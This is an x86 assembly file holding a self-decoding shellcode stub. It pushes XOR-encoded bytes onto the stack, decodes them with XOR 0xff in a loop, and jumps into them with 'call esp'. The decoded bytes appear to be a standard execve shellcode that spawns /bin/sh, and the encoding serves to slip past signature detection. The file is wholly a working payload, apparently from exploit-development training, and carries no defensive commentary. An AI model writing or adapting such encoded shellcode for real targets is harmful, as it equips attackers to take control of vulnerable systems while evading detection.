section .text
    global _start

_start:
    push 0x6f6f6f7f
    push 0x32f44f1c
    push 0x76969dd0
    push 0xd097978c
    push 0xd09197af
    push 0x1e0836ce     ;24=6*4 bytes long

    xor eax, eax
    xor ecx, ecx
    mov cl, 24

decode:
    mov al, [esp+ecx-1]         ; load a byte from the stack into AL
    xor al, 0xff                ; decode
    mov [esp+ecx-1], al         ; write it back into al
    loop decode                 ; loop as long as ecx is > 0, decrement ecx each iteration

    call esp                    ; execute the shellcode
